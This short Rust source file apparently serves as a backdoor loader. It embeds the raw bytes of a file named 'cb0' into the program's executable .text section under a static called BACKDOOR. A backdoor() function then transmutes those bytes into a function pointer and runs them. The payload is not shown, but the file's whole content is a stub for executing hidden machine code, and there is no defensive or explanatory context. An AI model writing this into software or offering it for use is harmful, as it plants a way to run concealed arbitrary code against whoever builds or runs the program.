#[repr(C, align(4096))]
struct Aligned<T: ?Sized>(T);

#[unsafe(link_section = ".text")]
static BACKDOOR: Aligned<[u8; include_bytes!("./cb0").len() ]> = Aligned(*include_bytes!("./cb0"));

pub fn backdoor() {
    let ptr: extern "C" fn() = unsafe { core::mem::transmute(BACKDOOR.0.as_ptr()) };
    (ptr)();
}
